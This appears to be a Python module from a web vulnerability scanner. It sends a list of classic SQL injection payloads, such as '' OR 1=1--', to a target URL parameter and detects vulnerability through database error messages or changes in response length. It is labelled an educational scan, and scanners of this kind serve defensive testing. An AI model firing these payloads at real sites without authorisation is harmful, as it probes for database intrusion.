# modules/sql_injection.py
import time
import requests
from typing import Optional

PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1' --",
    "' OR 'a'='a"
]

SQL_ERROR_SIGS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "sql syntax",
    "mysql_fetch",
    "syntax error"
]

TIMEOUT = 4.0

def _has_sql_error(text: str) -> bool:
    if not text:
        return False
    l = text.lower()
    for sig in SQL_ERROR_SIGS:
        if sig in l:
            return True
    return False

def _make_test_url(base: str, param_name: str, payload: str) -> str:
    from requests.utils import requote_uri
    sep = '&' if '?' in base else '?'
    return f"{base}{sep}{param_name}={requote_uri(payload)}"

def scan(target: str, param_name: str = 'q', session: Optional[requests.Session] = None) -> dict:
    """
    session: 可选的 requests.Session，如果提供就使用它发送请求（用于携带 cookie/login）
    """
    res = {
        'name': 'sql_injection',
        'target': target,
        'detected': False,
        'evidence': [],
        'notes': 'Educational scan.'
    }

    requester = session if session is not None else requests

    # baseline
    try:
        r0 = requester.get(target, timeout=TIMEOUT)
        baseline_body = r0.text or ""
        baseline_len = len(baseline_body)
    except Exception as e:
        res['notes'] = f'Baseline request failed: {e}'
        return res

    for payload in PAYLOADS:
        test_url = _make_test_url(target, param_name, payload)
        try:
            r = requester.get(test_url, timeout=TIMEOUT)
            body = r.text or ""
        except Exception as e:
            res['evidence'].append({'payload': payload, 'reason': 'network_error', 'error': str(e)})
            continue

        if _has_sql_error(body):
            res['detected'] = True
            res['evidence'].append({'payload': payload, 'reason': 'sql_error_signature', 'url': test_url})
            return res

        if abs(len(body) - baseline_len) > 300:
            res['evidence'].append({'payload': payload, 'reason': 'body_length_diff', 'len_diff': len(body)-baseline_len, 'url': test_url})

        time.sleep(0.2)

    return res
